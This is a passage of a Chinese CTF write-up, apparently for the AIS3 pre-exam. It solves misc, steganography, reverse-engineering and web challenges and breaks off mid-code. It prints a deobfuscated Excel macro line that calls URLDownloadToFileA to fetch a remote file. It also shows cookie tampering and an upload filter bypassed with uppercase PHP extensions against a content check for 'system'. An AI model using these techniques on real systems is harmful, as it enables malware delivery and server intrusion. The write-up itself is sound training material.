operator">!</span>U26<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>R1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>V9<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>R11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>X1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>D5<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Z19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>BA4<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Z9<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G7<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>U10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G18<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>V1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>O26<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>G5<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>H22<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>P10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>W17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>F8<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>L15<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>H3<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>U17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>BA11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>X12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>F14<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>B10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>V12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>P14<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Y1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>B10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>F16<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Q26<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>P25<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>M3<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>I26<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>L15<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>V25<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>G2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>I18<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>M4<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>C7<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>N5<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>M19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>J9<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>I7<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G13<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>M12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>X2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>M1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>P3<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>S12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>D16<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>P17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>I5<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>W24<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>E10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>B8<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>C14<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>Z15<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>BA11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>F19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Z2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>D13<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>O2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>D19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>K19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U20<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>Q9<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>I17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>X17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>Q24<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Q4<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N21<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>W11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>E17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>H19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>X6<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N26<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N18<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Q17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>J25<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Z16<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>P13<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Z21<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>C24<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>X19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>O21</code></pre><p>就可以得到下列的結果，把 space 去掉後就有 flag 了</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">=</span> C A L L <span class="token punctuation">(</span> <span class="token string">" u r l m o n "</span> , <span class="token string">" U R L D o w n l o a d T o F i l e A "</span> , <span class="token string">" J J C C B B "</span> , 0 , <span class="token string">" h t t p : / / a i s 3 . o r g / ? A I S 3 { X L M _ i S _ t o 0 _ o 1 d _ b u t _ c o 0 o 0 o 0 0 o l l l ! ! } "</span> , <span class="token string">" . \ ~ t m p . t x t "</span> , 0 , 0 <span class="token punctuation">)</span></code></pre><p>Flag <code>AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}</code></p><h3 id="Gift-in-the-dream"><a href="#Gift-in-the-dream" class="headerlink" title="Gift in the dream"></a>Gift in the dream</h3><p>下載後得到一個 gif，先看一下詳細的內容<br><code>exiftool gift_in_the_dream_updated.gif</code></p><p><img src="https://i.imgur.com/vJLD5fs.png"></p><p>從 comment 看到 <strong>why is the animation lagging? why is the duration so weird? is this just a dream?</strong><br>猜想跟時間間隔有關係，因此用 <code>identify</code> 去看，發現第一個間隔(65)很眼熟(‘A’)，於是將每個間隔當成 ascii 換成 chr<br><code>identify -format "%T " gift_in_the_dream_updated.gif</code><br><img src="https://i.imgur.com/F8iQrEy.png"></p><pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>Flag <code>AIS3{5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe}</code></p><h3 id="Knock"><a href="#Knock" class="headerlink" title="Knock"></a>Knock</h3><p><img src="https://i.imgur.com/txe3jYP.png"><br>將 token 輸入後會得到<br><img src="https://i.imgur.com/ik2HmRj.png"><br>用 Wireshark 去錄 Knock 後出現的東西，一樣看到了眼熟的<code>65</code>(<code>A</code>)，於是將數字當成 ascii 換成 chr<br><img src="https://i.imgur.com/b5dwczl.png"></p><pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>Flag <code>AIS3{kn0ckKNOCKknock}</code></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Time-Management"><a href="#Time-Management" class="headerlink" title="Time Management"></a>Time Management</h3><p>IDA Pro 看一下 main</p><p><img src="https://i.imgur.com/tyatVhK.png"></p><p>我們有 <code>secret[]</code> 和 <code>key[]</code>，所以只要照著把 <code>v4</code> 推出來就可以了</p><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> secret<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">861096257</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1869572219</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1601790322</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1769108595</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1601398638</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1633645417</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">2036430700</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1851875187</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1702065503</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1600943462</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1835888483</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2103733857</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">973148161</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">822358554</span><span class="token punctuation">,</span><span class="token number">4542272</span><span class="token punctuation">,</span><span class="token number">69014578</span><span class="token punctuation">,</span><span class="token number">973799469</span><span class="token punctuation">,</span><span class="token number">203030572</span><span class="token punctuation">,</span><span class="token number">222171395</span><span class="token punctuation">,</span><span class="token number">739379761</span><span class="token punctuation">,</span><span class="token number">436220160</span><span class="token punctuation">,</span><span class="token number">1280056077</span><span class="token punctuation">,</span><span class="token number">1043142173</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">23</span><span class="token punctuation">;</span> i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        res <span class="token operator">=</span> secret<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>secret<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>            res <span class="token operator">>>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Flag <code>AIS3{You_are_the_master_of_time_management!!!!!}</code></p><h3 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h3><p>和去年一樣是 Net 相關題<br>用 <code>dnSpy</code> 打開 <code>AIS3*dll</code> 檔案們，可以在框起來的幾個檔案中看到很多條件，將他們整理一下<br><img src="https://i.imgur.com/NpIy5Rp.png"></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># AIS3</span><span class="token comment" spellcheck="true">#       012345678901234</span><span class="token comment" spellcheck="true"># r = 'AIS3{'</span>ary <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token triple-quoted-string string">'''checklen(r)=45r[14]='A' r[3]='{''''</span><span class="token comment" spellcheck="true">#012</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>chr<span class="token punctuation">(</span>ary<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>ord<span class="token punctuation">(</span><span class="token string">'W'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># AIS33</span><span class="token comment" spellcheck="true">#     01234567890123456789012345678901234567890</span><span class="token comment" spellcheck="true">#r = 'D                                    G_G}'</span>ary1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token triple-quoted-string string">'''checklen(r)=41r[0]='D'r[40]='}'for i in range(3):    (int)(right[37 + i] ^ 'B') != array[i])'''</span><span class="token comment" spellcheck="true"># 37 38 39    </span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">[</span><span class="token number">37</span><span class="token operator">+</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> chr<span class="token punctuation">(</span>ary1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>ord<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># AIS333</span><span class="token comment" spellcheck="true">#      012345678901234567890123456789012345</span><span class="token comment" spellcheck="true"># r = '0T_N3T_FRAm3W0rk                  __</span>ary2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span><span class="token triple-quoted-string string">'''checklen(r)=36r[35]=r[34]='_'r[15]='k''''</span><span class="token comment" spellcheck="true"># 0-14</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>ary2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>ord<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># AIS3333</span><span class="token comment" spellcheck="true">#      012345678901234567</span><span class="token comment" spellcheck="true"># r = '_15_S0_C0mPlicaT3d</span>ary3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token triple-quoted-string string">'''checklen(r)=18int num = int.Parse(this._calculator.Calculate("1+" + right.Substring(1, 2)));if (num != 16) -> 1+(r[1]+r[2])==16? or 1+(r[1]r[2])==16? -> r[1:3] == `15` ?'''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>ary3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>ord<span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>整合以上的 <code>dll</code> 中得到的訊息</p><pre class=" language-bash"><code class="language-bash">      012345678901234r <span class="token operator">=</span> <span class="token string">'AIS3{'</span>     01234567890123456789012345678901234567890r <span class="token operator">=</span> <span class="token string">'D                                    G_G}'</span>     012345678901234567890123456789012345r <span class="token operator">=</span> <span class="token string">'0T_N3T_FRAm3W0rk       012345678901234567r = '</span>_15_S0_C0mPlicaT3d</code></pre><p>(第一句當首，第二句涵蓋尾，第三句 <code>NET</code> 前可能有 <code>DOT</code>，將它和第二句接起來；第四句剛好能放進剩餘的空格內)<br>Flag <code>AIS3{D0T_N3T_FRAm3W0rk_15_S0_C0mPlicaT3d__G_G}'</code></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Poking-Bear"><a href="#Poking-Bear" class="headerlink" title="Poking Bear"></a>Poking Bear</h3><blockquote><p>Poke the SECRET BEAR! </p></blockquote><p><img src="https://i.imgur.com/RZaxNT1.png"><br>Ice Bear 在 <code>bear/350</code> <img src="https://i.imgur.com/SpPfHPl.png"><br>Tasty Bear 在 <code>bear/777</code> <img src="https://i.imgur.com/odBz6VC.png"><br>那 Secret Bear 大概率在 350~777 中，於是就慢慢試…<br>直到 <code>bear/499</code> 出現了 Secret Bear<br><img src="https://i.imgur.com/3BFaDOs.png"><br>它叫我們 Human ，然後它說我們要是 <code>bear poker</code> 才能戳到 Secret Bear<br>按下 <code>Poke</code> 後，它會顯示<br><img src="https://i.imgur.com/Cu9kbc3.png"><br>看一下 Cookie ，它顯示我們是 Human<br><img src="https://i.imgur.com/A12hcbS.png"><br>將 <code>Value</code> 改成 <code>bear poker</code> 再 <code>Poke</code> 一次就能得到 flag 了<br><img src="https://i.imgur.com/8999rHs.png"><br>Flag <code>AIS3{y0u_P0l&lt;3_7h3_Bear_H@rdLy&gt;&lt;}</code></p><h3 id="Simple-File-Uploader"><a href="#Simple-File-Uploader" class="headerlink" title="Simple File Uploader"></a>Simple File Uploader</h3><p>我們可以上傳檔案，題目也給了 Source Code<br><img src="https://i.imgur.com/TsDV42N.png"><br><img src="https://i.imgur.com/Xr0KRQn.png"></p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span> <span class="token string">'php2'</span><span class="token punctuation">,</span> <span class="token string">'php3'</span><span class="token punctuation">,</span> <span class="token string">'php4'</span><span class="token punctuation">,</span> <span class="token string">'php5'</span><span class="token punctuation">,</span> <span class="token string">'php6'</span><span class="token punctuation">,</span> <span class="token string">'phtml'</span><span class="token punctuation">,</span> <span class="token string">'pht'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'p...php ?? (((ﾟДﾟ;)))'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>首先會擋掉以上的副檔名，但是沒有限制到大寫，所以可以 <code>PHP</code>,<code>Php</code>,<code>pHp</code>…隨便組合</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span 